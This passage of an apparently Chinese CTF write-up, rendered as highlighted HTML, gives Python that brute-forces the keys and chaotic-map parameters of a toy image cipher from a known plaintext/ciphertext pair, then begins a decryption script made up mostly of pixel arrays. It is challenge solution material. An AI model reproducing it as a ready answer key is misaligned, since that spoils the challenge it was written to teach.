class="number">39</span>, <span class="number">9</span>, <span class="number">192</span>, <span class="number">57</span>, <span class="number">166</span>, <span class="number">180</span>, <span class="number">153</span>, <span class="number">141</span>, <span class="number">19</span>, <span class="number">234</span>, <span class="number">157</span>, <span class="number">142</span>, <span class="number">80</span>, <span class="number">234</span>, <span class="number">197</span>, <span class="number">151</span>, <span class="number">152</span>, <span class="number">249</span>, <span class="number">143</span>, <span class="number">176</span>, <span class="number">155</span>, <span class="number">147</span>, <span class="number">17</span>, <span class="number">57</span>, <span class="number">194</span>, <span class="number">191</span>, <span class="number">254</span>, <span class="number">13</span>, <span class="number">144</span>, <span class="number">140</span>, <span class="number">85</span>, <span class="number">25</span>, <span class="number">248</span>, <span class="number">172</span>, <span class="number">208</span>, <span class="number">154</span>, <span class="number">249</span>, <span class="number">5</span>, <span class="number">201</span>, <span class="number">27</span>, <span class="number">137</span>, <span class="number">69</span>, <span class="number">23</span>, <span class="number">175</span>, <span class="number">34</span>, <span class="number">156</span>, <span class="number">72</span>, <span class="number">208</span>, <span class="number">32</span>, <span class="number">195</span>, <span class="number">16</span>, <span class="number">127</span>, <span class="number">65</span>, <span class="number">207</span>, <span class="number">131</span>, <span class="number">57</span>, <span class="number">203</span>, <span class="number">7</span>, <span class="number">98</span>, <span class="number">89</span>, <span class="number">36</span>, <span class="number">65</span>, <span class="number">75</span>, <span class="number">211</span>, <span class="number">21</span>, <span class="number">45</span>, <span class="number">132</span>, <span class="number">214</span>, <span class="number">239</span>, <span class="number">102</span>, <span class="number">58</span>, <span class="number">68</span>, <span class="number">130</span>, <span class="number">97</span>, <span class="number">204</span>, <span class="number">225</span>, <span class="number">76</span>, <span class="number">152</span>, <span class="number">216</span>, <span class="number">74</span>, <span class="number">149</span>, <span class="number">79</span>, <span class="number">165</span>, <span class="number">198</span>, <span class="number">72</span>, <span class="number">150</span>, <span class="number">94</span>, <span class="number">7</span>, <span class="number">177</span>, <span class="number">46</span>, <span class="number">226</span>, <span class="number">252</span>, <span class="number">247</span>, <span class="number">79</span>, <span class="number">62</span>, <span class="number">69</span>, <span class="number">106</span>, <span class="number">60</span>, <span class="number">21</span>, <span class="number">106</span>, <span class="number">236</span>, <span class="number">47</span>, <span class="number">145</span>, <span class="number">170</span>, <span class="number">28</span>, <span class="number">18</span>, <span class="number">101</span>, <span class="number">14</span>, <span class="number">152</span>, <span class="number">131</span>, <span class="number">7</span>, <span class="number">37</span>, <span class="number">15</span>, <span class="number">168</span>, <span class="number">99</span>, <span class="number">115</span>, <span class="number">27</span>, <span class="number">220</span>, <span class="number">150</span>, <span class="number">89</span>, <span class="number">82</span>, <span class="number">232</span>, <span class="number">170</span>, <span class="number">107</span>, <span class="number">221</span>, <span class="number">212</span>, <span class="number">46</span>, <span class="number">235</span>, <span class="number">129</span>, <span class="number">36</span>, <span class="number">66</span>, <span class="number">217</span>, <span class="number">222</span>, <span class="number">36</span>, <span class="number">15</span>, <span class="number">217</span>, <span class="number">192</span>, <span class="number">247</span>, <span class="number">192</span>, <span class="number">113</span>, <span class="number">230</span>, <span class="number">129</span>, <span class="number">196</span>, <span class="number">13</span>, <span class="number">247</span>, <span class="number">148</span>, <span class="number">228</span>, <span class="number">225</span>, <span class="number">86</span>, <span class="number">71</span>, <span class="number">133</span>, <span class="number">132</span>, <span class="number">238</span>, <span class="number">236</span>, <span class="number">127</span>, <span class="number">11</span>, <span class="number">83</span>, <span class="number">107</span>, <span class="number">141</span>, <span class="number">114</span>, <span class="number">150</span>, <span class="number">182</span>, <span class="number">146</span>, <span class="number">213</span>, <span class="number">250</span>, <span class="number">141</span>, <span class="number">53</span>, <span class="number">114</span>, <span class="number">16</span>, <span class="number">198</span>, <span class="number">70</span>, <span class="number">133</span>, <span class="number">17</span>, <span class="number">247</span>, <span class="number">173</span>, <span class="number">136</span>, <span class="number">73</span>, <span class="number">236</span>, <span class="number">78</span>, <span class="number">188</span>, <span class="number">150</span>, <span class="number">239</span>, <span class="number">58</span>, <span class="number">199</span>, <span class="number">136</span>, <span class="number">11</span>, <span class="number">122</span>, <span class="number">134</span>, <span class="number">77</span>, <span class="number">47</span>, <span class="number">167</span>, <span class="number">137</span>, <span class="number">188</span>, <span class="number">55</span>, <span class="number">195</span>, <span class="number">41</span>, <span class="number">49</span>, <span class="number">245</span>, <span class="number">92</span>, <span class="number">160</span>, <span class="number">213</span>, <span class="number">254</span>, <span class="number">0</span>, <span class="number">85</span>, <span class="number">205</span>, <span class="number">193</span>, <span class="number">69</span>, <span class="number">2</span>, <span class="number">140</span>, <span class="number">143</span>, <span class="number">155</span>, <span class="number">127</span>, <span class="number">236</span>, <span class="number">179</span>, <span class="number">199</span>, <span class="number">168</span>, <span class="number">35</span>, <span class="number">85</span>, <span class="number">40</span>, <span class="number">45</span>, <span class="number">174</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">round</span>(r*x*(<span class="number">3</span>-x), <span class="number">6</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">pixel, key1, key2, x0, m, n</span>):</span></span><br><span class="line">    num = m*n//<span class="number">8</span></span><br><span class="line">    seqs = []</span><br><span class="line">    x = x0</span><br><span class="line">    bins = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    tmp = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line">        x = generate(x)</span><br><span class="line">        tmp.append(x)</span><br><span class="line">        seqs.append(<span class="built_in">int</span>(x*<span class="number">22000</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> seqs:</span><br><span class="line">        bin_x = <span class="built_in">bin</span>(x)[<span class="number">2</span>:]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(bin_x) &lt; <span class="number">16</span>:</span><br><span class="line">            bin_x = <span class="string">&#x27;0&#x27;</span>*(<span class="number">16</span>-<span class="built_in">len</span>(bin_x))+bin_x</span><br><span class="line">        bins += bin_x</span><br><span class="line">    <span class="keyword">assert</span>(<span class="built_in">len</span>(pixel) == m*n)</span><br><span class="line">    cipher = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m) <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n)]   <span class="comment"># 64个零</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            index = n*i+j</span><br><span class="line">            ch = <span class="built_in">int</span>(bins[<span class="number">2</span>*index:<span class="number">2</span>*index+<span class="number">2</span>], <span class="number">2</span>)</span><br><span class="line">            pix = pixel[index]</span><br><span class="line">            <span class="keyword">if</span> ch == <span class="number">0</span>:</span><br><span class="line">                pix = (pix ^ key1) &amp; <span class="number">0xff</span></span><br><span class="line">            <span class="keyword">if</span> ch == <span class="number">1</span>:</span><br><span class="line">                pix = (~pix ^ key1) &amp; <span class="number">0xff</span></span><br><span class="line">            <span class="keyword">if</span> ch == <span class="number">2</span>:</span><br><span class="line">                pix = (pix ^ key2) &amp; <span class="number">0xff</span></span><br><span class="line">            <span class="keyword">if</span> ch == <span class="number">3</span>:</span><br><span class="line">                pix = (~pix ^ key2) &amp; <span class="number">0xff</span></span><br><span class="line">            cipher[index] = pix</span><br><span class="line">    <span class="keyword">return</span> cipher</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a = <span class="number">0</span></span><br><span class="line">key1key2 = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>*<span class="number">16</span>):</span><br><span class="line">    a = testimage[i] ^ encrypt_testimage[i]</span><br><span class="line">    <span class="comment"># a 就是前16个key1和key2的组合</span></span><br><span class="line">    key1key2.append(encrypt_testimage[i] ^ a &amp; <span class="number">0xff</span>)</span><br><span class="line"></span><br><span class="line">x0 = <span class="number">0.999999</span></span><br><span class="line"></span><br><span class="line">list_r = [<span class="number">1.1</span>, <span class="number">1.2</span>, <span class="number">1.3</span>]</span><br><span class="line">keys1 = [<span class="number">78</span>, <span class="number">177</span>]</span><br><span class="line">keys2 = [<span class="number">86</span>, <span class="number">169</span>]</span><br><span class="line"><span class="keyword">while</span> x0 &gt;= <span class="number">0.000001</span>:</span><br><span class="line">    <span class="keyword">for</span> r <span class="keyword">in</span> list_r:</span><br><span class="line">        c = []</span><br><span class="line">        <span class="keyword">for</span> key1 <span class="keyword">in</span> keys1:</span><br><span class="line">            <span class="keyword">for</span> key2 <span class="keyword">in</span> keys2:</span><br><span class="line">                cipher = encrypt(testimage, key1, key2, x0, <span class="number">16</span>, <span class="number">16</span>)</span><br><span class="line">                <span class="keyword">if</span> cipher == encrypt_testimage:</span><br><span class="line">                    <span class="built_in">print</span>(r, x0, key1, key2)</span><br><span class="line">        <span class="keyword">for</span> key2 <span class="keyword">in</span> keys1:</span><br><span class="line">            <span class="keyword">for</span> key1 <span class="keyword">in</span> keys2:</span><br><span class="line">                cipher = encrypt(testimage, key1, key2, x0, <span class="number">16</span>, <span class="number">16</span>)</span><br><span class="line">                <span class="keyword">if</span> cipher == encrypt_testimage:</span><br><span class="line">                    <span class="built_in">print</span>(r, x0, key1, key2)</span><br><span class="line">    x0 = <span class="built_in">round</span>(x0-<span class="number">0.000001</span>, <span class="number">6</span>)</span><br><span class="line">    <span class="built_in">print</span>(x0)</span><br></pre></td></tr></table></figure>

<h3 id="三、解密"><a href="#三、解密" class="headerlink" title="三、解密"></a>三、解密</h3><p>爆出这些东西，应该就可以搞了，其实加密函数同时也是解密函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> digits</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">encrypt_flagimage = [<span class="number">198</span>, <span class="number">143</span>, <span class="number">247</span>, <span class="number">3</span>, <span class="number">152</span>, <span class="number">139</span>, <span class="number">131</span>, <span class="number">84</span>, <span class="number">181</span>, <span class="number">180</span>, <span class="number">252</span>, <span class="number">177</span>, <span class="number">192</span>, <span class="number">25</span>, <span class="number">217</span>, <span class="number">179</span>, <span class="number">136</span>, <span class="number">107</span>, <span class="number">190</span>, <span class="number">62</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">90</span>, <span class="number">53</span>, <span class="number">105</span>, <span class="number">238</span>, <span class="number">117</span>, <span class="number">44</span>, <span class="number">5</span>, <span class="number">116</span>, <span class="number">132</span>, <span class="number">195</span>, <span class="number">214</span>, <span class="number">171</span>, <span class="number">113</span>, <span class="number">209</span>, <span class="number">18</span>, <span class="number">31</span>, <span class="number">194</span>, <span class="number">174</span>, <span class="number">228</span>, <span class="number">212</span>, <span class="number">196</span>, <span class="number">14</span>, <span class="number">27</span>, <span class="number">41</span>, <span class="number">211</span>, <span class="number">56</span>, <span class="number">139</span>, <span class="number">135</span>, <span class="number">225</span>, <span class="number">214</span>, <span class="number">89</span>, <span class="number">122</span>, <span class="number">178</span>, <span class="number">212</span>, <span class="number">185</span>, <span class="number">231</span>, <span class="number">204</span>, <span class="number">150</span>, <span class="number">204</span>, <span class="number">212</span>, <span class="number">160</span>, <span class="number">142</span>, <span class="number">213</span>, <span class="number">173</span>, <span class="number">186</span>, <span class="number">166</span>, <span class="number">65</span>, <span class="number">238</span>, <span class="number">5</span>, <span class="number">32</span>, <span class="number">45</span>, <span class="number">31</span>, <span class="number">25</span>, <span class="number">189</span>, <span class="number">148</span>, <span class="number">38</span>, <span class="number">78</span>, <span class="number">79</span>, <span class="number">33</span>, <span class="number">56</span>, <span class="number">227</span>, <span class="number">48</span>, <span class="number">103</span>, <span class="number">163</span>, <span class="number">31</span>, <span class="number">189</span>, <span class="number">37</span>, <span class="number">124</span>, <span class="number">106</span>, <span class="number">249</span>, <span class="number">86</span>, <span class="number">188</span>, <span class="number">86</span>, <span class="number">233</span>, <span class="number">41</span>, <span class="number">250</span>, <span class="number">89</span>, <span class="number">7</span>, <span class="number">212</span>, <span class="number">234</span>, <span class="number">111</span>, <span class="number">104</span>, <span class="number">245</span>, <span class="number">102</span>, <span class="number">227</span>, <span class="number">96</span>, <span class="number">160</span>, <span class="number">67</span>, <span class="number">181</span>, <span class="number">13</span>, <span class="number">26</span>, <span class="number">192</span>, <span class="number">214</span>, <span class="number">210</span>, <span class="number">188</span>, <span class="number">84</span>, <span class="number">216</span>, <span class="number">215</span>, <span class="number">243</span>, <span class="number">72</span>, <span class="number">233</span>, <span class="number">2</span>, <span class="number">122</span>, <span class="number">166</span>, <span class="number">107</span>, <span class="number">251</span>, <span class="number">70</span>, <span class="number">128</span>, <span class="number">94</span>, <span class="number">190</span>, <span class="number">185</span>, <span class="number">210</span>, <span class="number">34</span>, <span class="number">85</span>, <span class="number">77</span>, <span class="number">29</span>, <span class="number">182</span>, <span class="number">77</span>, <span class="number">115</span>, <span class="number">208</span>, <span class="number">228</span>, <span class="number">252</span>, <span class="number">73</span>, <span class="number">198</span>, <span class="number">151</span>, <span class="number">70</span>, <span class="number">10</span>, <span class="number">97</span>, <span class="number">138</span>, <span class="number">235</span>, <span class="number">21</span>, <span class="number">117</span>, <span class="number">239</span>, <span class="number">102</span>, <span class="number">129</span>, <span class="number">2</span>, <span class="number">253</span>, <span class="number">80</span>, <span class="number">53</span>, <span class="number">61</span>, <span class="number">184</span>, <span class="number">220</span>, <span class="number">41</span>, <span class="number">82</span>, <span class="number">37</span>, <span class="number">140</span>, <span class="number">23</span>, <span class="number">143</span>, <span class="number">179</span>, <span class="number">53</span>, <span class="number">153</span>, <span class="number">113</span>, <span class="number">213</span>, <span class="number">211</span>, <span class="number">111</span>, <span class="number">197</span>, <span class="number">248</span>, <span class="number">65</span>, <span class="number">60</span>, <span class="number">69</span>, <span class="number">1</span>, <span class="number">81</span>, <span class="number">48</span>, <span class="number">254</span>, <span class="number">251</span>, <span class="number">89</span>, <span class="number">195</span>, <span class="number">8</span>, <span class="number">93</span>, <span class="number">190</span>, <span class="number">66</span>, <span class="number">174</span>, <span class="number">97</span>, <span class="number">175</span>, <span class="number">210</span>, <span class="number">191</span>, <span class="number">66</span>, <span class="number">112</span>, <span class="number">123</span>, <span class="number">128</span>, <span class="number">33</span>, <span class="number">230</span>, <span class="number">237</span>, <span class="number">104</span>, <span class="number">16</span>, <span class="number">192</span>, <span class="number">239</span>, <span class="number">173</span>, <span class="number">44</span>, <span class="number">10</span>, <span class="number">120</span>, <span class="number">231</span>, <span class="number">114</span>, <span class="number">151</span>, <span class="number">140</span>, <span class="number">63</span>, <span class="number">103</span>, <span class="number">44</span>, <span class="number">243</span>, <span class="number">222</span>, <span class="number">242</span>, <span class="number">73</span>, <span class="number">51</span>, <span class="number">46</span>, <span class="number">98</span>, <span class="number">137</span>, <span class="number">163</span>, <span class="number">152</span>, <span class="number">147</span>, <span class="number">95</span>, <span class="number">223</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">112</span>, <span class="number">85</span>, <span class="number">215</span>, <span class="number">133</span>, <span class="number">131</span>, <span class="number">240</span>, <span class="number">239</span>, <span class="number">224</span>, <span class="number">195</span>, <span class="number">140</span>, <span class="number">124</span>, <span class="number">70</span>, <span class="number">156</span>, <span class="number">221</span>, <span class="number">241</span>, <span class="number">37</span>, <span class="number">245</span>, <span class="number">1</span>, <span class="number">99</span>, <span class="number">9</span>, <span class="number">157</span>, <span class="number">99</span>, <span class="number">150</span>, <span class="number">47</span>, <span class="number">118</span>, <span class="number">225</span>, <span class="number">16</span>, <span class="number">13</span>, <span class="number">141</span>, <span class="number">135</span>, <span class="number">99</span>, <span class="number">18</span>, <span class="number">119</span>, <span class="number">63</span>, <span class="number">160</span>, <span class="number">6</span>, <span class="number">247</span>, <span class="number">27</span>, <span class="number">68</span>, <span class="number">45</span>, <span class="number">199</span>, <span class="number">86</span>, <span class="number">193</span>, <span class="number">252</span>, <span class="number">21</span>, <span class="number">135</span>, <span class="number">32</span>, <span class="number">42</span>, <span class="number">103</span>, <span class="number">114</span>, <span class="number">241</span>, <span class="number">49</span>, <span class="number">249</span>, <span class="number">182</span>, <span class="number">52</span>, <span class="number">18</span>, <span class="number">155</span>, <span class="number">157</span>, <span class="number">61</span>, <span class="number">4</span>, <span class="number">246</span>, <span class="number">158</span>, <span class="number">52</span>, <span class="number">118</span>, <span class="number">242</span>, <span class="number">195</span>, <span class="number">54</span>, <span class="number">139</span>, <span class="number">232</span>, <span class="number">100</span>, <span class="number">31</span>, <span class="number">11</span>, <span class="number">233</span>, <span class="number">58</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">137</span>, <span class="number">83</span>, <span class="number">145</span>, <span class="number">209</span>, <span class="number">7</span>, <span class="number">241</span>, <span class="number">96</span>, <span class="number">57</span>, <span class="number">148</span>, <span class="number">207</span>, <span class="number">29</span>, <span class="number">237</span>, <span class="number">124</span>, <span class="number">177</span>, <span class="number">166</span>, <span class="number">161</span>, <span class="number">20</span>, <span class="number">116</span>, <span class="number">122</span>, <span class="number">61</span>, <span class="number">71</span>, <span class="number">46</span>, <span class="number">82</span>, <span class="number">18</span>, <span class="number">157</span>, <span class="number">253</span>, <span class="number">130</span>, <span class="number">112</span>, <span class="number">66</span>, <span class="number">94</span>, <span class="number">57</span>, <span class="number">221</span>, <span class="number">243</span>, <span class="number">222</span>, <span class="number">192</span>, <span class="number">147</span>, <span class="number">5</span>, <span class="number">130</span>, <span class="number">201</span>, <span class="number">174</span>, <span class="number">26</span>, <span class="number">160</span>, <span class="number">16</span>, <span class="number">188</span>, <span class="number">103</span>, <span class="number">187</span>, <span class="number">11</span>, <span class="number">238</span>, <span class="number">182</span>, <span class="number">144</span>, <span class="number">4</span>, <span class="number">137</span>, <span class="number">33</span>, <span class="number">84</span>, <span class="number">100</span>, <span class="number">7</span>, <span class="number">239</span>, <span class="number">219</span>, <span class="number">83</span>, <span class="number">112</span>, <span class="number">189</span>, <span class="number">166</span>, <span class="number">58</span>, <span class="number">93</span>, <span class="number">141</span>, <span class="number">30</span>, <span class="number">198</span>, <span class="number">220</span>, <span class="number">196</span>, <span class="number">118</span>, <span class="number">172</span>, <span class="number">5</span>, <span class="number">45</span>]</span><br><span class="line"></span><br><span class="line">testimage = [<span class="number">205</span>, <span class="number">237</span>, <span class="number">6</span>, <span class="number">158</span>, <span class="number">24</span>, <span class="number">119</span>, <span class="number">213</span>, <span class="number">32</span>, <span class="number">74</span>, <span class="number">151</span>, <span class="number">142</span>, <span class="number">186</span>, <span class="number">57</span>, <span class="number">28</span>, <span class="number">113</span>, <span class="number">62</span>, <span class="number">165</span>, <span class="number">20</span>, <span class="number">190</span>, <span class="number">37</span>, <span class="number">159</span>, <span class="number">137</span>, <span class="number">196</span>, <span class="number">44</span>, <span class="number">97</span>, <span class="number">37</span>, <span class="number">7</span>, <span class="number">222</span>, <span class="number">220</span>, <span class="number">95</span>, <span class="number">4</span>, <span class="number">66</span>, <span class="number">0</span>, <span class="number">28</span>, <span class="number">199</span>, <span class="number">142</span>, <span class="number">95</span>, <span class="number">105</span>, <span class="number">119</span>, <span class="number">232</span>, <span class="number">250</span>, <span class="number">215</span>, <span class="number">60</span>, <span class="number">162</span>, <span class="number">91</span>, <span class="number">211</span>, <span class="number">63</span>, <span class="number">30</span>, <span class="number">91</span>, <span class="number">108</span>, <span class="number">217</span>, <span class="number">206</span>, <span class="number">80</span>, <span class="number">193</span>, <span class="number">230</span>, <span class="number">42</span>, <span class="number">221</span>, <span class="number">71</span>, <span class="number">136</span>, <span class="number">115</span>, <span class="number">22</span>, <span class="number">176</span>, <span class="number">91</span>, <span class="number">57</span>, <span class="number">61</span>, <span class="number">3</span>, <span class="number">87</span>, <span class="number">73</span>, <span class="number">250</span>, <span class="number">121</span>, <span class="number">51</span>, <span class="number">72</span>, <span class="number">83</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">199</span>, <span class="number">236</span>, <span class="number">190</span>, <span class="number">249</span>, <span class="number">116</span>, <span class="number">45</span>, <span class="number">6</span>, <span class="number">134</span>, <span class="number">110</span>, <span class="number">149</span>, <span class="number">94</span>, <span class="number">214</span>, <span class="number">232</span>, <span class="number">153</span>, <span class="number">213</span>, <span class="number">119</span>, <span class="number">98</span>, <span class="number">81</span>, <span class="number">203</span>, <span class="number">240</span>, <span class="number">114</span>, <span class="number">240</span>, <span class="number">29</span>, <span class="number">122</span>, <span class="number">188</span>, <span class="number">156</span>, <span class="number">53</span>, <span class="number">128</span>, <span class="number">185</span>, <span class="number">40</span>, <span class="number">147</span>, <span class="number">245</span>, <span class="number">204</span>, <span class="number">47</span>, <span class="number">101</span>, <span class="number">80</span>, <span class="number">229</span>, <span class="number">41</span>, <span class="number">150</span>, <span class="number">28</span>, <span class="number">195</span>, <span class="number">25</span>, <span class="number">235</span>, <span class="number">119</span>, <span class="number">6</span>, <span class="number">192</span>, <span class="number">8</span>, <span class="number">73</span>, <span class="number">255</span>, <span class="number">159</span>, <span class="number">172</span>, <span class="number">77</span>, <span class="number">94</span>, <span class="number">254</span>, <span class="number">104</span>, <span class="number">236</span>, <span class="number">219</span>, <span class="number">141</span>, <span class="number">91</span>, <span class="number">195</span>, <span class="number">162</span>, <span class="number">97</span>, <span class="number">56</span>, <span class="number">252</span>, <span class="number">173</span>, <span class="number">163</span>, <span class="number">43</span>, <span class="number">167</span>, <span class="number">214</span>, <span class="number">50</span>, <span class="number">73</span>, <span class="number">115</span>, <span class="number">190</span>, <span class="number">254</span>, <span class="number">53</span>, <span class="number">61</span>, <span class="number">77</span>, <span class="number">138</span>, <span class="number">192</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">190</span>, <span class="number">27</span>, <span class="number">37</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">135</span>, <span class="number">90</span>, <span class="number">215</span>, <span class="number">106</span>, <span class="number">243</span>, <span class="number">112</span>, <span class="number">111</span>, <span class="number">106</span>, <span class="number">89</span>, <span class="number">143</span>, <span class="number">150</span>, <span class="number">185</span>, <span class="number">142</span>, <span class="number">192</span>, <span class="number">176</span>, <span class="number">48</span>, <span class="number">138</span>, <span class="number">164</span>, <span class="number">185</span>, <span class="number">61</span>, <span class="number">77</span>, <span class="number">72</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">203</span>, <span class="number">210</span>, <span class="number">71</span>, <span class="number">186</span>, <span class="number">49</span>, <span class="number">162</span>, <span class="number">250</span>, <span class="number">218</span>, <span class="number">219</span>, <span class="number">195</span>, <span class="number">63</span>, <span class="number">248</span>, <span class="number">220</span>, <span class="number">155</span>, <span class="number">180</span>, <span class="number">219</span>, <span class="number">132</span>, <span class="number">219</span>, <span class="number">94</span>, <span class="number">144</span>, <span class="number">247</span>, <span class="number">211</span>, <span class="number">95</span>, <span class="number">70</span>, <span class="number">227</span>, <span class="number">222</span>, <span class="number">31</span>, <span class="number">69</span>, <span class="number">24</span>, <span class="number">13</span>, <span class="number">216</span>, <span class="number">185</span>, <span class="number">108</span>, <span class="number">137</span>, <span class="number">57</span>, <span class="number">186</span>, <span class="number">211</span>, <span class="number">55</span>, <span class="number">27</span>, <span class="number">158</span>, <span class="number">241</span>, <span class="number">223</span>, <span class="number">21</span>, <span class="number">134</span>, <span class="number">106</span>, <span class="number">152</span>, <span class="number">127</span>, <span class="number">187</span>, <span class="number">245</span>, <span class="number">246</span>, <span class="number">131</span>, <span class="number">176</span>, <span class="number">177</span>, <span class="number">228</span>, <span class="number">100</span>, <span class="number">112</span>, <span class="number">11</span>, <span class="number">84</span>, <span class="number">61</span>, <span class="number">193</span>, <span class="number">42</span>, <span class="number">41</span>, <span class="number">69</span>, <span class="number">229</span>, <span class="number">145</span>, <span class="number">254</span>, <span class="number">138</span>, <span class="number">3</span>, <span class="number">153</span>, <span class="number">123</span>, <span class="number">31</span>]</span><br><span class="line"></span><br><span class="line">encrypt_testimage = [<span class="number">131</span>, <span class="number">92</span>, <span class="number">72</span>, <span class="number">47</span>, <span class="number">177</span>, <span class="number">57</span>, <span class="number">131</span>, <span class="number">118</span>, <span class="number">4</span>, <span class="number">38</span>, <span class="number">192</span>, <span class="number">19</span>, <span class="number">119</span>, <span class="number">82</span>, <span class="number">63</span>, <span class="number">143</span>, <span class="number">235</span>, <span class="number">165</span>, <span class="number">15</span>, <span class="number">140</span>, <span class="number">209</span>, <span class="number">223</span>, <span class="number">117</span>, <span class="number">133</span>, <span class="number">47</span>, <span class="number">148</span>, <span class="number">81</span>, <span class="number">144</span>, <span class="number">138</span>, <span class="number">246</span>, <span class="number">173</span>, <span class="number">235</span>, <span class="number">177</span>, <span class="number">181</span>, <span class="number">110</span>, <span class="number">39</span>, <span class="number">9</span>, <span class="number">192</span>, <span class="number">57</span>, <span class="number">166</span>, <span class="number">180</span>, <span class="number">153</span>, <span class="number">141</span>, <span class="number">19</span>, <span class="number">234</span>, <span class="number">157</span>, <span class="number">142</span>, <span class="number">80</span>, <span class="number">234</span>, <span class="number">197</span>, <span class="number">151</span>, <span class="number">152</span>, <span class="number">249</span>, <span class="number">143</span>, <span class="number">176</span>, <span class="number">155</span>, <span class="number">147</span>, <span class="number">17</span>, <span class="number">57</span>, <span class="number">194</span>, <span class="number">191</span>, <span class="number">254</span>, <span class="number">13</span>, <span class="number">144</span>, <span class="number">140</span>, <span class="number">85</span>, <span class="number">25</span>, <span class="number">248</span>, <span class="number">172</span>, <span class="number">208</span>, <span class="number">154</span>, <span class="number">249</span>, <span class="number">5</span>, <span class="number">201</span>, <span class="number">27</span>, <span class="number">137</span>, <span class="number">69</span>, <span class="number">23</span>, <span class="number">175</span>, <span class="number">34</span>, <span class="number">156</span>, <span class="number">72</span>, <span class="number">208</span>, <span class="number">32</span>, <span class="number">195</span>, <span class="number">16</span>, <span class="number">127</span>, <span class="number">65</span>, <span class="number">207</span>, <span class="number">131</span>, <span class="number">57</span>, <span class="number">203</span>, <span class="number">7</span>, <span class="number">98</span>, <span class="number">89</span>, <span class="number">36</span>, <span class="number">65</span>, <span class="number">75</span>, <span class="number">211</span>, <span class="number">21</span>, <span class="number">45</span>, <span class="number">132</span>, <span class="number">214</span>, <span class="number">239</span>, <span class="number">102</span>, <span class="number">58</span>, <span class="number">68</span>, <span class="number">130</span>, <span class="number">97</span>, <span class="number">204</span>, <span class="number">225</span>, <span class="number">76</span>, <span class="number">152</span>, <span class="number">216</span>, <span class="number">74</span>, <span class="number">149</span>, <span class="number">79</span>, <span class="number">165</span>, <span class="number">198</span>, <span class="number">72</span>, <span class="number">150</span>, <span class="number">94</span>, <span class="number">7</span>, <span class="number">177</span>, <span class="number">46</span>, <span class="number">226</span>, <span class="number">252</span>, <span class="number">247</span>, <span class="number">79</span>, <span class="number">62</span>, <span class="number">69</span>, <span class="number">106</span>, <span class="number">60</span>, <span class="number">21</span>, <span class="number">106</span>, <span class="number">236</span>, <span class="number">47</span>, <span class="number">145</span>, <span class="number">170</span>, <span class="number">28</span>, <span class="number">18</span>, <span class="number">101</span>, <span class="number">14</span>, <span class="number">152</span>, <span class="number">131</span>, <span class="number">7</span>, <span class="number">37</span>, <span class="number">15</span>, <span class="number">168</span>, <span class="number">99</span>, <span class="number">115</span>, <span class="number">27</span>, <span class="number">220</span>, <span class="number">150</span>, <span class="number">89</span>, <span class="number">82</span>, <span class="number">232</span>, <span class="number">170</span>, <span class="number">107</span>, <span class="number">221</span>, <span class="number">212</span>, <span class="number">46</span>, <span class="number">235</span>, <span class="number">129</span>, <span class="number">36</span>, <span class="number">66</span>, <span class="number">217</span>, <span class="number">222</span>, <span class="number">36</span>, <span class="number">15</span>, <span class="number">217</span>, <span class="number">192</span>, <span class="number">247</span>, <span class="number">192</span>, <span class="number">113</span>, <span class="number">230</span>, <span class="number">129</span>, <span class="number">196</span>, <span class="number">13</span>, <span class="number">247</span>, <span class="number">148</span>, <span class="number">228</span>, <span class="number">225</span>, <span class="number">86</span>, <span class="number">71</span>, <span class="number">133</span>, <span class="number">132</span>, <span class="number">238</span>, <span class="number">236</span>, <span class="number">127</span>, <span class="number">11</span>, <span class="number">83</span>, <span class="number">107</span>, <span class="number">141</span>, <span class="number">114</span>, <span class="number">150</span>, <span class="number">182</span>, <span class="number">146</span>, <span class="number">213</span>, <span class="number">250</span>, <span class="number">141</span>, <span class="number">53</span>, <span class="number">114</span>, <span class="number">16</span>, <span class="number">198</span>, <span class="number">70</span>, <span class="number">133</span>, <span class="number">17</span>, <span class="number">247</span>, <span class="number">173</span>, <span class="number">136</span>, <span class="number">73</span>, <span class="number">236</span>, <span class="number">78</span>, <span class="number">188</span>, <span class="number">150</span>, <span class="number">239</span>, <span class="number">58</span>, <span class="number">199</span>, <span class="number">136</span>, <span class="number">11</span>, <span class="number">122</span>, <span class="number">134</span>, <span class="number">77</span>, <span class="number">47</span>, <span class="number">167</span>, <span class="number">137</span>, <span class="number">188</span>, <span class="number">55</span>, <span class="number">195</span>, <span class="number">41</span>, <span class="number">49</span>, <span class="number">245</span>, <span class="number">92</span>, <span class="number">160</span>, <span class="number">213</span>, <span class="number">254</span>, <span class="number">0</span>, <span class="number">85</span>, <span class="number">205</span>, <span class="number">193</span>, <span class="number">69</span>, <span class="number">2</span>, <span class="number">140</span>, <span class="number">143</span>, <span 